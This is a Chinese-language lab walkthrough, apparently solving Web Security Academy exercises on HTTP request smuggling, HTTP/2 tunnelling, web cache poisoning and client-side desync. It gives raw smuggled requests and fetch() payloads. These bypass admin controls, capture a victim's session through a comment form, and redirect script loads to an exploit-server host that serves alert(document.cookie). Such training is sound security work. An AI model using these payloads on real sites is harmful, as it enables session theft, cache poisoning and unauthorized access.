+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218203045545.png" alt="image-20221218203045545"></p>
+<p>这里同样的我们也可以毒化 &#x2F;resources&#x2F;js&#x2F;tracking.js 文件</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218204501009.png" alt="image-20221218204501009"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/javascript; charset=utf-8</span><br><span class="line"></span><br><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218195727231.png" alt="image-20221218195727231"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218204544966.png" alt="image-20221218204544966"></p>
+<h1 id="利用-HTTP-请求走私来执行-Web-缓存欺骗"><a href="#利用-HTTP-请求走私来执行-Web-缓存欺骗" class="headerlink" title="利用 HTTP 请求走私来执行 Web 缓存欺骗"></a>利用 HTTP 请求走私来执行 Web 缓存欺骗</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218210212625.png" alt="image-20221218210212625"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218210232787.png" alt="image-20221218210232787"></p>
+<p>先登录进去</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ac7004404ab1579c685fa5e00ba00c1.web-security-academy.net</span><br><span class="line">Content-Length: 34</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /404page HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+
+<p>测试走私类型</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218210947458.png" alt="image-20221218210947458"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218210951858.png" alt="image-20221218210951858"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ac7004404ab1579c685fa5e00ba00c1.web-security-academy.net</span><br><span class="line">Content-Length: 37</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /my-account HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+
+<p>走私页面</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218213549540.png" alt="image-20221218213549540"></p>
+<p>在静态资源中去寻找那个请求会走私 my-account</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218214354462.png" alt="image-20221218214354462"></p>
+<p>开一个无痕去获取一下 静态资源  由于静态资源有可能存在 缓存</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218214511785.png" alt="image-20221218214511785"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218214544402.png" alt="image-20221218214544402"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218214550517.png" alt="image-20221218214550517"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218214603867.png" alt="image-20221218214603867"></p>
+<h1 id="通过-HTTP-x2F-2-请求隧道绕过访问控制"><a href="#通过-HTTP-x2F-2-请求隧道绕过访问控制" class="headerlink" title="通过 HTTP&#x2F;2 请求隧道绕过访问控制"></a>通过 HTTP&#x2F;2 请求隧道绕过访问控制</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218215033162.png" alt="image-20221218215033162"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218224608353.png" alt="image-20221218224608353"></p>
+<p>可以看到search存在回显  并且POST也可以接收</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218224627002.png" alt="image-20221218224627002"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218224704779.png" alt="image-20221218224704779"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a8e0079035f1caec050b90f00bf0078.web-security-academy.net</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218231935602.png" alt="image-20221218231935602"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Foo:x</span><br><span class="line">Content-Length: 100</span><br><span class="line"></span><br><span class="line">search=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218232203816.png" alt="image-20221218232203816"></p>
+<p>成功拿到 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-SSL-VERIFIED: 0</span><br><span class="line">X-SSL-CLIENT-CN: null</span><br><span class="line">X-FRONTEND-KEY: 6123624132834107</span><br></pre></td></tr></table></figure>
+
+<p>这里简单理解一下 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219161451744.png" alt="image-20221219161451744"></p>
+<p>我们发送的请求类似于此  这里前端和后端都同意只有一个请求, 但是我们可以让他们在标题结束的位置上不一致  前端将我们注入的所有内容识别为标头的一部分 因此在comment&#x3D; 字符串后面可以添加任何新的标头,而在后端 看到 \r\n\r\n 序列 并认为这是标头的结尾 使得字符串 comment&#x3D;内部标头一起被视为正文的一部分 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219161824652.png" alt="image-20221219161824652"></p>
+<p>尝试 走私admin页面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Foo:x</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 0a8e0079035f1caec050b90f00bf0078.web-security-academy.net</span><br><span class="line">X-SSL-VERIFIED: 1</span><br><span class="line">X-SSL-CLIENT-CN: administrator</span><br><span class="line">X-FRONTEND-KEY: 6123624132834107</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218232349029.png" alt="image-20221218232349029"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218233847947.png" alt="image-20221218233847947"></p>
+<p>这里发现并没有返回 admin页面 </p>
+<p>接下来需要修改请求头为HEAD了 对于HEAD请求的响应通常包含一个 content-length标头,即使他们没有自己的正文,这通常是指GET请求返回的资源长度,一些服务器无法解决这个问题,并且无论如何都会尝试读取标头中指定的字节数, 如果成功通过执行此操作的前段服务传送请求,可能导致过度读取来自后端的响应</p>
+<p>这里修改请求头为HEAD 发现接收到了 3335个字节 但是实际上应该有 8295个字节 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218234126206.png" alt="image-20221218234126206"></p>
+<p>那么这里的这两个数值分别代表什么呢</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218234321747.png" alt="image-20221218234321747"></p>
+<p>可以发现 这里的8295其实是我们初始路径的 响应字节 那么很容易理解 这个3335就是 &#x2F;admin页面的字节数量了</p>
+<p>也就是说 后端服务器分成了两部分返回了这个响应  首先返回了 响应头其中带有 Content-Length: 8295  前端服务器看到这个 Content-Length: 8295 说我要接受这么多值 但是&#x2F;admin页面只有3335个字节 导致响应出错 因此我们需要去寻找一个 初始路径让他的Content-Length 小一点</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218234746748.png" alt="image-20221218234746748"></p>
+<p>比如 search 123</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218234853586.png" alt="image-20221218234853586"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Foo:x</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">X-SSL-VERIFIED: 1</span><br><span class="line">X-SSL-CLIENT-CN: administrator</span><br><span class="line">X-FRONTEND-KEY: 6123624132834107</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221218235008058.png" alt="image-20221218235008058"></p>
+<h1 id="通过-HTTP-x2F-2-请求隧道的-Web-缓存投毒"><a href="#通过-HTTP-x2F-2-请求隧道的-Web-缓存投毒" class="headerlink" title="通过 HTTP&#x2F;2 请求隧道的 Web 缓存投毒"></a>通过 HTTP&#x2F;2 请求隧道的 Web 缓存投毒</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219165256782.png" alt="image-20221219165256782"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219174326730.png" alt="image-20221219174326730"></p>
+<p>首先来理解一下这个 X-Cache: hit 当这个请求头为hit时代表当前请求会从缓存资源中获取,服务器不会产生新的响应,因此我们需要通过更改请求路径的方式来让响应重新产生 即产生 X-Cache: miss响应头</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219174554148.png" alt="image-20221219174554148"></p>
+<p>我们先尝试走私一个请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?X=1 HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /post?postId=9 HTTP/1.1</span><br><span class="line">Foo:x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219175050955.png" alt="image-20221219175050955"></p>
+<p>发现响应还是正常的 这里我们需要使用上一关的 HEAD请求头来进行尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?X=2 HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /post?postId=9 HTTP/1.1</span><br><span class="line">Foo:x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219175135611.png" alt="image-20221219175135611"></p>
+<p>可见成功返回了第二个响应 需要注意是是缓存问题</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219175259639.png" alt="image-20221219175259639"></p>
+<p>也就是说如果我们 再次访问这个 &#x2F;?X&#x3D;2 就会成为 &#x2F;post?postId&#x3D;9 原因就是产生了缓存</p>
+<p>比如我现在使用&#x2F;?X&#x3D;4</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219180101921.png" alt="image-20221219180101921"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219180114812.png" alt="image-20221219180114812"></p>
+<p>可以发现确实是这样的</p>
+<p>那么现在我们需要去寻找一个 http请求 这个请求十分类似于反射型xss </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219185651735.png" alt="image-20221219185651735"></p>
+<p>可以看到在请求头上面返回了url信息 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?X=2 HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /resources?x=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1</span><br><span class="line">Foo:x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219190007308.png" alt="image-20221219190007308"></p>
+<p>但是这里可以发现 出现了一点点问题 原因是什么呢 由于第一个请求 <code>1</code> 的前端服务器收到 Content-Length是 8217 因此他期待的 响应数据量是 8217.但是我们 第二个请求<code>/resources?x=&lt;script&gt;alert(1)&lt;/script&gt;</code> 返回的信息不够 8217个 因此导致前端服务器一直在等待着接收数据 从而产生time out   因此我们需要让第二个请求的 响应大一点</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219191411002.png" alt="image-20221219191411002"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219191906407.png" alt="image-20221219191906407"></p>
+<p>那么现在我们需要去毒化 根目录 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /resources?x=&lt;script&gt;alert(1)&lt;/script&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa HTTP/1.1</span><br><span class="line">Foo:x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219192006908.png" alt="image-20221219192006908"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219192034857.png" alt="image-20221219192034857"></p>
+<h1 id="Client-side-desync"><a href="#Client-side-desync" class="headerlink" title="Client-side desync"></a>Client-side desync</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219205006301.png" alt="image-20221219205006301"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219205116697.png" alt="image-20221219205116697"></p>
+<p>这里我们可以看到 访问根目录会重定向到 &#x2F;en</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219205426624.png" alt="image-20221219205426624"></p>
+<p>尝试更改请求方式并添加超长的 Content-Length 发现服务器端 并没有显示超时 说明服务器并没有使用这个Content-Length</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a9700f903ad0995c358bf4400840022.web-security-academy.net</span><br><span class="line">Connection: keep-live</span><br><span class="line">Content-Length: 28</span><br><span class="line"></span><br><span class="line">GET /404page HTTP/1.1</span><br><span class="line">Foo:x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219210351701.png" alt="image-20221219210351701"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219210359917.png" alt="image-20221219210359917"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a9700f903ad0995c358bf4400840022.web-security-academy.net</span><br><span class="line">Connection: keep-live</span><br><span class="line">Content-Length: 28</span><br><span class="line"></span><br><span class="line">GET /404page HTTP/1.1</span><br><span class="line">Foo:xGET / HTTP/1.1</span><br><span class="line">Host: 0a9700f903ad0995c358bf4400840022.web-security-academy.net</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, </span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>拼接后的请求  Content-Length 是几其实无所谓的</p>
+<p>现在我们需要去获取到用户的cookie 类似于之前的关卡 我们尝试使用comment来进行获取headers</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a9700f903ad0995c358bf4400840022.web-security-academy.net</span><br><span class="line">Connection: keep-live</span><br><span class="line">Content-Length: 591</span><br><span class="line"></span><br><span class="line">POST /en/post/comment HTTP/1.1</span><br><span class="line">Host: 0a9700f903ad0995c358bf4400840022.web-security-academy.net</span><br><span class="line">Cookie: session=cE9CrzKa22jKIkFiMYvKoWCbKqIaqmWe; _lab_analytics=NfVwccQpxK3BIkQk9qFWwzqXNOtlPZqRmGRlXT75pvRe6GCnz8iWEFDKb4ZcAyXp8tAOB3jnWVqtZXAYKamrr1kh1kTuyn9phzMv4HbM5JIyPQupVv06BQHsERYt3wIl4IjQTvrwVhGMvpRcHZNFjrloW4hR3qLjR3cKTIqlIUQ8TwvXg6hcsQhSH8oMsucImqpSnQetiodrsl8bFURbkXDDU86sSdG5of0OqqiG3P92fR6biUE9tRx8fFTkHAIz</span><br><span class="line">Content-Length: 190</span><br><span class="line">Content-Type: x-www-form-urlencoded</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">csrf=qrNpbDkopnDUPZEIn5OawdpvrIeIECc4&amp;postId=6&amp;name=1&amp;email=1@wan.com&amp;website=&amp;comment=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219222414428.png" alt="image-20221219222414428"></p>
+<p>发现可以通过Comment来获取用户的请求头 那么现在我们需要做的就是寻找方式让这个请求体发生在客户端并且需要携带着用户的cookie 来完成我们的comment 下面是客户端异步</p>
+<p>开个新的 Chrome 不能给浏览器配置代理 也就是不能使用burp的</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219220618118.png" alt="image-20221219220618118"></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://0a9700f903ad0995c358bf4400840022.web-security-academy.net&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">body</span>: <span class="string">&#x27;GET /hopefully404 HTTP/1.1\r\nFoo: x&#x27;</span>,</span><br><span class="line">    <span class="comment">//这里是相当于我们构造的第二个请求信息</span></span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="comment">// 这里使用了cors 原因是如果我们请求过去的话浏览器就会重定向 但是使用cors就会导致跨域请求出现错误 </span></span><br><span class="line">    <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//前一个请求抛出异常之后会执行这个请求因为是同一个 连接 因此会触发 404请求</span></span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://0a9700f903ad0995c358bf4400840022.web-security-academy.net&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219220651790.png" alt="image-20221219220651790"></p>
+<p>现在我们已经能够发送 走私请求了 我们现在要构造comment请求去获取用户信息了</p>
+<p>直接用hackvertor替换下请求</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219223034485.png" alt="image-20221219223034485"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch(&#x27;https://0a9700f903ad0995c358bf4400840022.web-security-academy.net&#x27;, &#123;</span><br><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    body: &#x27;POST /en/post/comment HTTP/1.1\r\nHost: 0a9700f903ad0995c358bf4400840022.web-security-academy.net\r\nCookie: session=cE9CrzKa22jKIkFiMYvKoWCbKqIaqmWe; _lab_analytics=NfVwccQpxK3BIkQk9qFWwzqXNOtlPZqRmGRlXT75pvRe6GCnz8iWEFDKb4ZcAyXp8tAOB3jnWVqtZXAYKamrr1kh1kTuyn9phzMv4HbM5JIyPQupVv06BQHsERYt3wIl4IjQTvrwVhGMvpRcHZNFjrloW4hR3qLjR3cKTIqlIUQ8TwvXg6hcsQhSH8oMsucImqpSnQetiodrsl8bFURbkXDDU86sSdG5of0OqqiG3P92fR6biUE9tRx8fFTkHAIz\r\nContent-Length: 490\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=qrNpbDkopnDUPZEIn5OawdpvrIeIECc4&amp;postId=6&amp;name=1&amp;email=1@wan.com&amp;website=&amp;comment=&#x27;,</span><br><span class="line">    mode: &#x27;cors&#x27;,</span><br><span class="line">    credentials: &#x27;include&#x27;,</span><br><span class="line">&#125;).catch(() =&gt; &#123;</span><br><span class="line">        fetch(&#x27;https://0a9700f903ad0995c358bf4400840022.web-security-academy.net/cap&#x27;, &#123;</span><br><span class="line">        mode: &#x27;no-cors&#x27;,</span><br><span class="line">        credentials: &#x27;include&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219223145549.png" alt="image-20221219223145549"></p>
+<p>成功抓到请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;fetch(&#x27;https://0a9700f903ad0995c358bf4400840022.web-security-academy.net&#x27;, &#123;</span><br><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    body: &#x27;POST /en/post/comment HTTP/1.1\r\nHost: 0a9700f903ad0995c358bf4400840022.web-security-academy.net\r\nCookie: session=cE9CrzKa22jKIkFiMYvKoWCbKqIaqmWe; _lab_analytics=NfVwccQpxK3BIkQk9qFWwzqXNOtlPZqRmGRlXT75pvRe6GCnz8iWEFDKb4ZcAyXp8tAOB3jnWVqtZXAYKamrr1kh1kTuyn9phzMv4HbM5JIyPQupVv06BQHsERYt3wIl4IjQTvrwVhGMvpRcHZNFjrloW4hR3qLjR3cKTIqlIUQ8TwvXg6hcsQhSH8oMsucImqpSnQetiodrsl8bFURbkXDDU86sSdG5of0OqqiG3P92fR6biUE9tRx8fFTkHAIz\r\nContent-Length: 1050\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=qrNpbDkopnDUPZEIn5OawdpvrIeIECc4&amp;postId=6&amp;name=1&amp;email=1@wan.com&amp;website=&amp;comment=&#x27;,</span><br><span class="line">    mode: &#x27;cors&#x27;,</span><br><span class="line">    credentials: &#x27;include&#x27;,</span><br><span class="line">&#125;).catch(() =&gt; &#123;</span><br><span class="line">        fetch(&#x27;https://0a9700f903ad0995c358bf4400840022.web-security-academy.net/capvi&#x27;, &#123;</span><br><span class="line">        mode: &#x27;no-cors&#x27;,</span><br><span class="line">        credentials: &#x27;include&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>现在我们需要将这个请求发送给 受害者拉</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219223828204.png" alt="image-20221219223828204"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219223818325.png" alt="image-20221219223818325"></p>
+<h1 id="通过客户端不同步的浏览器缓存中毒"><a href="#通过客户端不同步的浏览器缓存中毒" class="headerlink" title="通过客户端不同步的浏览器缓存中毒"></a>通过客户端不同步的浏览器缓存中毒</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219230506210.png" alt="image-20221219230506210"></p>
+<p>这里通过尝试可以发现在 根目录下 是会解析Content-Length 的 但是在 &#x2F;%2e%2e%2f 下并不会解析</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219230733708.png" alt="image-20221219230733708"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219230744635.png" alt="image-20221219230744635"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219230759069.png" alt="image-20221219230759069"></p>
+<p>那么我们可以通过  &#x2F;%2e%2e%2f 这个路径来走私信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /%2e%2e%2f HTTP/1.1</span><br><span class="line">Host: 0a6900f8041dd622c2db443d006a0039.web-security-academy.net</span><br><span class="line">Content-Length: 1</span><br><span class="line"></span><br><span class="line">GET /404page HTTP/1.1</span><br><span class="line">Foo:x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219230955149.png" alt="image-20221219230955149"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219231000596.png" alt="image-20221219231000596"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch(&#x27;https://0a6900f8041dd622c2db443d006a0039.web-security-academy.net/%2e%2e%2f&#x27;, &#123;</span><br><span class="line">        method: &#x27;POST&#x27;,</span><br><span class="line">        body: &#x27;GET /hopefully404 HTTP/1.1\r\nFoo: x&#x27;,</span><br><span class="line">        mode: &#x27;no-cors&#x27;,</span><br><span class="line">        credentials: &#x27;include&#x27;,</span><br><span class="line">    &#125;).then(() =&gt; &#123;</span><br><span class="line">        fetch(&#x27;https://0a6900f8041dd622c2db443d006a0039.web-security-academy.net/&#x27;, &#123;</span><br><span class="line">        mode: &#x27;no-cors&#x27;,</span><br><span class="line">        credentials: &#x27;include&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219231407296.png" alt="image-20221219231407296"></p>
+<p>这里经过观察发现 在&#x2F;resources&#x2F;images&#x2F;avatarDefault.svg 会将url 重定向成小写的形式</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219232218778.png" alt="image-20221219232218778"></p>
+<p>那么相应的如果我们的url是大写是否会重定向呢</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219232304547.png" alt="image-20221219232304547"></p>
+<p>也是同样的</p>
+<p>尝试利用绝对路径重定向到我们的服务器上面</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219232404537.png" alt="image-20221219232404537"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219232415139.png" alt="image-20221219232415139"></p>
+<p>那么现在我们将第一个请求修改重定向位置为我们的服务器 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /%2e%2e%2f HTTP/1.1</span><br><span class="line">Host: 0a6900f8041dd622c2db443d006a0039.web-security-academy.net</span><br><span class="line">Content-Length: 1</span><br><span class="line"></span><br><span class="line">GET //exploit-0a14002f0412d632c24d43e2010b0021.exploit-server.net/Exploit HTTP/1.1</span><br><span class="line">Foo:x</span><br></pre></td></tr></table></figure>
+
+<p>第二个修改为&#x2F;resources&#x2F;js&#x2F;analytics.js 发现页面发生了重定向操作</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219232532993.png" alt="image-20221219232532993"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch(&#x27;https://0a6900f8041dd622c2db443d006a0039.web-security-academy.net/%2e%2e%2f&#x27;, &#123;</span><br><span class="line">        method: &#x27;POST&#x27;,</span><br><span class="line">        body: &#x27;GET //exploit-0a14002f0412d632c24d43e2010b0021.exploit-server.net/Exploit HTTP/1.1\r\nFoo: x&#x27;,</span><br><span class="line">        mode: &#x27;no-cors&#x27;,</span><br><span class="line">        credentials: &#x27;include&#x27;,</span><br><span class="line">    &#125;).then(() =&gt; &#123;</span><br><span class="line">        fetch(&#x27;https://0a6900f8041dd622c2db443d006a0039.web-security-academy.net/resources/js/analytics.js&#x27;, &#123;</span><br><span class="line">        mode: &#x27;no-cors&#x27;,</span><br><span class="line">        credentials: &#x27;include&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>在执行代码之前首先清除一下浏览器记录</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219232847219.png" alt="image-20221219232847219"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221219233614495.png" alt="image-20221219233614495"></p>
+<p>可以发现js代码重定向了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie);</span><br><span class="line">/*&lt;script&gt;const labURL = &quot;https://0a6900f8041dd622c2db443d006a0039.web-security-academy.net&quot;;</span><br><span class="line">const exploitHost = &quot;exploit-0a14002f0412d632c24d43e2010b0021.exploit-server.net&quot;;</span><br><span class="line"></span><br><span class="line">if(window.name != &#x27;skip&#x27;)&#123;</span><br><span class="line">    window.name = &#x27;skip&#x27;; </span><br><span class="line">    fetch(`$&#123;labURL&#125;/..%2f`, &#123; method: &#x27;POST&#x27;, body: `GET //$&#123;exploitHost&#125;/Exploit HTTP/1.1\r\nFoo: x`, credentials: &#x27;include&#x27;, mode: &#x27;no-cors&#x27; &#125;).then(() =&gt; &#123;location=`$&#123;labURL&#125;/resources/js/analytics.js`&#125; );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    window.name = &#x27;&#x27;;</span><br><span class="line">    location = `$&#123;labURL&#125;/login`;</span><br><span class="line">&#125;&lt;/script&gt;*/</span><br></pre></td></tr></table></figure>
+
